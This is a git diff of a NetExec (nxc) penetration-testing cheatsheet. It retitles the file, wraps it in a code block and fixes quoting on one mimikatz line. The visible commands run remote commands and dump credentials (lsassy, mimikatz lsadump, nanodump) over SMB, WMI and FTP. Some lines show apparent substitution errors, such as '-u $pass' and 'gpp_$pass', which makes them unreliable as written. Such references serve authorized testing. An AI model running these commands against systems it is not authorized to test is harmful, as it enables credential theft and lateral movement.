@@ -1,4 +1,6 @@
-# nxc Cheatsheet
+# All NetExec Commands from their Wiki
+
+```bash
 nxc $ip -u $user -p $pass --sessions
 nxc $ip -u $user -p $pass -x whoami
 nxc ftp $ip -u $pass -p $pass --ls
@@ -102,7 +104,7 @@ nxc smb $ip -u $user -p $pass -M enum_av
 nxc smb $ip -u $user -p $pass -M gpp_$pass
 nxc smb $ip -u $user -p $pass -M lsassy
 nxc smb $ip -u $user -p $pass -M mimikatz
-nxc smb $ip -u $user -p $pass -M mimikatz -o COMMAND='"lsadump
+nxc smb $ip -u $user -p $pass -M mimikatz -o COMMAND="lsadump"
 nxc smb $ip -u $user -p $pass -M mremoteng
 nxc smb $ip -u $user -p $pass -M msol
 nxc smb $ip -u $user -p $pass -M nanodump
@@ -157,3 +159,4 @@ nxc wmi $ip -u $user -p $pass -d $dom
 nxc wmi $ip -u $user -p $user --local-auth
 sudo nxc smb $dc --use-kcache -x whoami
 sudo nxc smb $dc -k -u $user -p $pass
+```
